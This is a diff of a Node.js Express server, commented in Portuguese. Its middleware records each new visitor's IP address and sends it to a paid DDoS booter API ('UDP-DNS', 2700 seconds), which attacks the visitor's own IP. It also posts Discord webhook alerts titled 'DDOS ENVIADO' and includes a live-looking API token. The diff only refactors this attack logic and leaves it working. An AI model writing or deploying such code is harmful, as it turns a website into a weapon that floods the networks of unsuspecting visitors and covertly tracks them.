@@ -15,26 +15,80 @@ let lock = false;
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=2700&method=UDP-DNS`;
     try {
-        for (let i = 0; i < 6; i++) {
-            await axios.get(url);
-            console.log(`Requisição ${i + 1} enviada para o IP: ${ip}`);
-        }
+        await axios.get(url);
+        console.log(`Requisição enviada para o IP: ${ip}`);
     } catch (error) {
         console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
     }
 }
 
+// Função para enviar webhooks ao Discord
+async function sendDiscordWebhooks(ip, timestamp) {
+    try {
+        await axios.post(discordWebhookUrl, {
+            embeds: [{
+                title: 'Novo Visitante',
+                description: `Um novo visitante acessou o site.`,
+                color: 5814783,
+                fields: [
+                    {
+                        name: 'IP',
+                        value: ip,
+                        inline: true
+                    },
+                    {
+                        name: 'Data e Hora',
+                        value: timestamp,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: 'Visitante registrado'
+                },
+                timestamp: new Date()
+            }]
+        });
+
+        await axios.post(discordWebhookUrl2, {
+            embeds: [{
+                title: 'DDOS ENVIADO',
+                description: `Um novo visitante acessou o site.`,
+                color: 5814783,
+                fields: [
+                    {
+                        name: 'IP',
+                        value: ip,
+                        inline: true
+                    },
+                    {
+                        name: 'Concurrents',
+                        value: '6',
+                        inline: true
+                    },
+                    {
+                        name: 'Time',
+                        value: '2700',
+                        inline: true
+                    }
+                ],
+                timestamp: new Date()
+            }]
+        });
+    } catch (error) {
+        console.error('Erro ao enviar webhooks:', error.message);
+    }
+}
+
+// Função para limpar o arquivo de visitantes
 async function cleanupVisitors() {
     try {
         const now = new Date();
         let config;
 
-   
         try {
             const configData = await fs.readFile(configFile);
             config = JSON.parse(configData);
         } catch (err) {
-       
             console.log('Config file not found or unreadable. Creating a new one.');
             config = { lastCleanup: now.toISOString() };
             await fs.writeFile(configFile, JSON.stringify(config, null, 2));
@@ -42,13 +96,10 @@ async function cleanupVisitors() {
 
         const lastCleanup = new Date(config.lastCleanup);
 
-       
         if ((now - lastCleanup) >= 5 * 60 * 1000) {
-            
             await fs.writeFile(visitorsFile, JSON.stringify([], null, 2));
             console.log('Visitors file cleaned.');
 
-           
             config.lastCleanup = now.toISOString();
             await fs.writeFile(configFile, JSON.stringify(config, null, 2));
             console.log('Config updated.');
@@ -60,24 +111,18 @@ async function cleanupVisitors() {
     }
 }
 
-
 setInterval(cleanupVisitors, 5 * 60 * 1000);
-
-
 cleanupVisitors().catch(err => console.error('Error executing cleanup on startup:', err));
-
-
 
 app.use(async (req, res, next) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const timestamp = new Date().toISOString();
 
     if (lock) {
-   
         await new Promise(resolve => setTimeout(resolve, 100));
     }
 
-    lock = true; 
+    lock = true;
 
     try {
         let visitors = [];
@@ -90,78 +135,26 @@ app.use(async (req, res, next) => {
             }
         }
 
-        const exists = visitors.some(visitor => visitor.ip === ip);
+        const ipEntry = visitors.find(visitor => visitor.ip === ip);
 
-        if (!exists) {
+        if (!ipEntry) {
             visitors.push({ ip, timestamp });
             await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
-            sendApiRequest(ip)
-            
-            await axios.post(discordWebhookUrl, {
-                embeds: [{
-                    title: 'Novo Visitante',
-                    description: `Um novo visitante acessou o site.`,
-                    color: 5814783, 
-                    fields: [
-                        {
-                            name: 'IP',
-                            value: ip,
-                            inline: true
-                        },
-                        {
-                            name: 'Data e Hora',
-                            value: timestamp,
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: 'Visitante registrado'
-                    },
-                    timestamp: new Date()
-                }]
-            });
-
-            await axios.post(discordWebhookUrl2, {
-                embeds: [{
-                    title: 'DDOS ENVIADO',
-                    description: `Um novo visitante acessou o site.`,
-                    color: 5814783, 
-                    fields: [
-                        {
-                            name: 'IP',
-                            value: ip,
-                            inline: true
-                        },
-                        {
-                            name: 'Concurrents',
-                            value: '6',
-                            inline: true
-                        },
-                        {
-                            name: 'Time',
-                            value: '2700',
-                            inline: true
-                        }
-                    ],
-                    timestamp: new Date()
-                }]
-            });
+            await sendApiRequest(ip);
+            await sendDiscordWebhooks(ip, timestamp);
         }
     } catch (err) {
         console.error('Error processing visitors file:', err);
     } finally {
-        lock = false; 
+        lock = false;
     }
 
     next();
 });
 
-
 app.use(express.static(path.join(__dirname, 'public')));
 
-
 app.use('/admin', require('./routes/admin'));
-
 
 app.listen(port, () => {
     console.log(`Server is running at http://localhost:${port}`);
